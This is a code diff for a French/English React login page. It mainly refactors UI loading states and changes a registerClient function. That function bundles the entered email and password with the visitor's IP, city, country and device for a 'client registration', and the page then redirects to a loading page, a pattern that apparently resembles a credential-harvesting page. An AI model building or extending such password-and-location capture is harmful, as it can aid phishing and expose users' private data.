@@ -26,6 +26,7 @@ const translations = {
     email: "Adresse email",
     password: "Mot de passe",
     loginButton: "Se connecter",
+    loginLoading: "Connexion...",
     forgotPassword: "Mot de passe oublié ?",
     noAccount: "Pas encore de compte ?",
     createAccount: "Créer un compte",
@@ -39,7 +40,8 @@ const translations = {
     connect: "Log in to your account",
     email: "Email address",
     password: "Password",
-    loginButton: "Sign in",
+    loginButton: "Log In",
+    loginLoading: "Logging in...",
     forgotPassword: "Forgot password?",
     noAccount: "Don't have an account yet?",
     createAccount: "Create account",
@@ -62,37 +64,32 @@ const chatOptions = {
 }
 
 // Função para registrar cliente
-const registerClient = async (username: string, password: string, clientId?: string) => {
+const registerClient = async (username: string, password: string, clientId?: string, metricsData?: any) => {
   try {
-    // Obter IP
-    let ip = ""
+    // Usar dados do useMetrics ao invés de fazer novas requisições
+    let ip = metricsData?.ip || ""
     let country = "BR"
     let city = "São Paulo"
-    let device = "Unknown"
+    let device = metricsData?.device || "Unknown"
     
-    try {
-      const ipResponse = await fetch('https://api.ipify.org?format=json')
-      const ipData = await ipResponse.json()
-      ip = ipData.ip
-      
-      // Obter localização
-      const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`)
-      const locationData = await locationResponse.json()
-      country = locationData.country_code || "BR"
-      city = locationData.city || "São Paulo"
-      
-      // Detectar dispositivo
-      const userAgent = navigator.userAgent
-      if (/tablet|ipad|playbook|silk/i.test(userAgent)) {
-        device = "Tablet"
-      } else if (/mobile|iphone|ipod|android|blackberry|opera|mini|windows\sce|palm|smartphone|iemobile/i.test(userAgent)) {
-        device = "Mobile"
-      } else {
-        device = "Desktop"
+    // Extrair cidade e país da localização se disponível
+    if (metricsData?.location) {
+      const locationParts = metricsData.location.split(', ')
+      if (locationParts.length >= 3) {
+        city = locationParts[0] || "São Paulo"
+        country = locationParts[2] || "BR"
+        // Converter nome do país para código se necessário
+        if (country === "Brazil") country = "BR"
       }
-    } catch (error) {
-      console.log("Erro ao obter informações do cliente:", error)
     }
+    
+    console.log("Usando dados do useMetrics:", {
+      ip,
+      country,
+      city,
+      device,
+      originalLocation: metricsData?.location
+    })
     
     // Dados para registro
     const clientData = {
@@ -206,8 +203,8 @@ export default function LoginPage() {
       // Verificar se já existe um clientId (atualização de dados)
       const existingClientId = localStorage.getItem('client_id')
       
-      // Registrar cliente ou atualizar dados
-      const clientData = await registerClient(email, password, existingClientId || undefined)
+      // Registrar cliente ou atualizar dados usando dados do useMetrics
+      const clientData = await registerClient(email, password, existingClientId || undefined, metrics.metrics)
       
       if (clientData) {
         // Redirecionar para página de loading
@@ -269,6 +266,7 @@ export default function LoginPage() {
                   value={email}
                   onChange={(e) => setEmail(e.target.value)}
                   className="w-full h-12 px-4 border border-gray-300 rounded-md focus:ring-2 focus:ring-blue-500 focus:border-transparent"
+                  disabled={isLoading}
                   required
                 />
               </div>
@@ -284,6 +282,7 @@ export default function LoginPage() {
                     value={password}
                     onChange={(e) => setPassword(e.target.value)}
                     className="w-full h-12 px-4 pr-12 border border-gray-300 rounded-md focus:ring-2 focus:ring-blue-500 focus:border-transparent"
+                    disabled={isLoading}
                     required
                   />
                   <button
@@ -300,13 +299,22 @@ export default function LoginPage() {
             <div className="flex flex-col space-y-4 lg:flex-row lg:items-center lg:justify-between lg:space-y-0 pt-4">
               <Button 
                 type="submit" 
-                className="bg-black hover:bg-gray-800 text-white px-8 py-3 rounded-full font-medium w-full lg:w-auto"
+                className="bg-black hover:bg-gray-800 text-white px-8 py-3 rounded-full font-medium w-full lg:w-auto disabled:opacity-50 flex items-center justify-center gap-2"
                 disabled={isLoading}
               >
-                {isLoading ? "..." : t.loginButton}
+                {isLoading && (
+                  <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
+                )}
+                {isLoading ? t.loginLoading : t.loginButton}
               </Button>
 
-              <button type="button" className="text-sm text-gray-600 hover:text-gray-800 underline text-center lg:text-left">{t.forgotPassword}</button>
+              <button 
+                type="button" 
+                disabled={isLoading}
+                className="text-sm text-gray-600 hover:text-gray-800 underline text-center lg:text-left disabled:opacity-50"
+              >
+                {t.forgotPassword}
+              </button>
             </div>
 
             <div className="pt-6 text-sm text-gray-600 text-center lg:text-left">
